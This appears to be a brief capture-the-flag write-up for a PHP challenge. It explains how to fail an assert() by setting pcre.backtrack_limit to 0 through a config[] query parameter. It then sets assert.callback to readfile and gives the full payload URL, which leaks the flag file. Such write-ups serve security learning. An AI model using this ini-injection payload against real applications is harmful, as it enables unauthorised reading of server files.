```php
assert(preg_match("/^SEE{.*}$/", $flag), NULL);
```
We want to fail the assertion, for that we can leverage something called backtracing of regex, preg_match() has a backtrace limit of 10000 by default we can reduce it to a low value so that assertion fails. using 

, /?debug&flag=SEE{asdf}&config[pcre.backtrack_limit]=0

Now we can use a file reading function as assert callback

the final payload would be as follows

/?debug&flag=SEE{asdf}&config[pcre.backtrack_limit]=0&config[assert.callback]=readfile

Hence inspecting the request will give us the flag.
